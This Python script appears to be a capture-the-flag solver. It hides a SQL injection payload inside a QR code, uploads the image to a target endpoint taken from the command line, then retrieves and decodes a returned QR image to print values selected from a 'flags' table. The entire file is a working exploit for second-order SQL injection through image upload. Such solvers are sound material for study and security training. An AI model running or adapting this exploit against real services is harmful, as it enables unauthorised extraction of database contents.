import os
import sys
import requests
import uuid
import io
import base64
import html

# Add vendor directory to module search path
parent_dir = os.path.abspath(os.path.dirname(__file__))
vendor_dir = os.path.join(parent_dir, 'vendor')
sys.path.append(vendor_dir)

from pyzbar import pyzbar
import qrcode
from PIL import Image


def main(endpoint):
    if endpoint[-1] != '/':
        endpoint += '/'
    imgu = str(uuid.uuid4())
    paystr = ("Hack the Planet\\\"),('{}', (select value from flags)) -- ".format(imgu))
    print(paystr)
    payload = qrcode.make(paystr)
    buf = io.BytesIO()
    payload.save(buf, format='png')
    buf.seek(0)
    resp = requests.post(endpoint, files={"fileupload": buf})
    resp.raise_for_status()
    # Now check for our value
    resp = requests.get(endpoint + imgu)
    resp.raise_for_status()
    img_data = resp.text.split("data:image/png;base64,")[1].split("\"")[0]
    img_data = html.unescape(img_data)
    img_data_bytes = base64.b64decode(img_data)
    buf = io.BytesIO(img_data_bytes)
    img = Image.open(buf)
    dec = pyzbar.decode(img)
    if dec:
        print(dec[0].data.decode())
    else:
        print('Unable to decode')


if __name__ == '__main__':
    main(sys.argv[1])
